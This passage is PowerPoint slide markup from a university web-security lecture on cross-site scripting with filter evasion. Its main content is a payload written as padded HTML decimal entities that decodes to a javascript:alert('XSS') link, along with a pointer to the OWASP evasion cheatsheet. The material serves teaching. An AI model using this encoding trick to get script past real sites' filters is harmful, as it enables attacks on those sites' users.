                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000106</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000097</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000118</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000097 </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000115</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000099</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000114</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000105</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000112</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000116</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>000 	0058</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000097</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000108</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000101</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000114</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000116</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000040</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000039</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000088</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000083</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000083</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000039</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>#</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="098557"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>0000041</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Check</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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out</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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website</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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for</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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u="sng" sz="2800">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>filter</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-90">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>evasion</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-70">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>cheatsheet</a:t>
            </a:r>
            <a:endParaRPr sz="2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30"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-235"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ATTACK</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-145"/>
              <a:t>WITH</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t>FILTER</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>EVASION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="object 3" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3165030" y="1784350"/>
            <a:ext cx="6670040" cy="4382135"/>
            <a:chOff x="3165030" y="1784350"/>
            <a:chExt cx="6670040" cy="4382135"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="object 4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174491" y="2526791"/>
              <a:ext cx="6650735" cy="3630167"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3169792" y="2522029"/>
              <a:ext cx="6660515" cy="3639820"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6660515" h="3639820">
                  <a:moveTo>
                    <a:pt x="0" y="3639692"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6660260" y="3639692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6660260" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3639692"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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260841" y="1784350"/>
              <a:ext cx="1134579" cy="1134617"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962050" y="1533220"/>
            <a:ext cx="7239000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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Still,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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inject</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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code</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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into</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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page!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8" name="object 8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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
